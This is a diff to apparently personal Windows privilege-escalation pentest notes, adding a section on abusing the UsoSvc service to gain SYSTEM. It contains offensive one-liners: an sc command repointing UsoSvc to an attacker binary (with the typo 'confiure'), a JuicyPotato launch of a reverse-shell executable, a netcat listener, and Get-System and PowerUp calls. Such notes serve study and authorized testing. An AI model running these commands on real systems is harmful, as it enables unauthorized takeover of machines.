@@ -490,6 +490,16 @@ nc -lnvp <port>
 C:\Windows\Temp\JuicyPotato.exe -p revshell.exe -a "/c whoami > C:\Users\Public\morph3.txt" -t * -l 1031 -c {d20a3293-3341-4ae8-9aaf-8e397cb63c34}
 
 
+# UsoSVC Escalation
+Starting from Windows 10 1803/Win Server 2019 up to September 2019
+Security Update it was possible for "SERVICE" accounts to abuse
+"UsoSvc" and get SYSTEM privileges.
+Once we had compromised a Service account, all we needed to do from
+a cmd was:
+
+sc stop UsoSvc & sc confiure UsoSvc binpath= c:\myevilprog.exe & sc start UsoSvc
+
+
 # Metasploit Privilege Escalation
 Metasploit basically uses the techniques we have seen
 But on older Windows versions it also tries additional privilege
@@ -539,4 +549,6 @@ powershell.exe -c "Import-Module C:\Users\Public\Get-System.ps1; Get-System"
 ;; powerup checks for common Windows privilege escalation vectors that rely on misconfigurations
 . .\PowerUp.ps1
 Invoke-AllChecks
+
+
 
